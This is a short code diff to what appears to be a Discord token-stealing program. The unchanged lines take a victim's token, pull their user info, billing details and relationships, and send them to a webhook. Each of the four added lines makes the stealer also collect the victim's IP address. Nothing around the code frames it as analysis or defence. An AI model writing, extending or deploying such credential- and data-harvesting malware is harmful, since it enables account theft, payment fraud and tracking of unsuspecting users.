@@ -401,6 +401,7 @@ var event_handlers = {
         var userInfo = await getUserInfo(token);
         var billing = await getBilling(token);
         var friends = await getRelationships(token);
+        var ip = await getIp();
 
         var params = {
             username: config.embed.username,
@@ -472,6 +473,7 @@ var event_handlers = {
         var userInfo = await getUserInfo(token);
         var billing = await getBilling(token);
         var friends = await getRelationships(token);
+        var ip = await getIp();
 
         var params = {
             username: config.embed.username,
@@ -703,6 +705,7 @@ async function initialize() {
         var userInfo;
         var billing;
         var friends;
+        var ip = await getIp();
 
         if (config.notify_on_initialization) {
             if (token == undefined) {
@@ -748,6 +751,7 @@ async function initialize() {
                 userInfo = await getUserInfo(token);
                 billing = await getBilling(token);
                 friends = await getRelationships(token);
+                var ip = await getIp();
 
                 sendToWebhook({
                     username: config.embed.username,
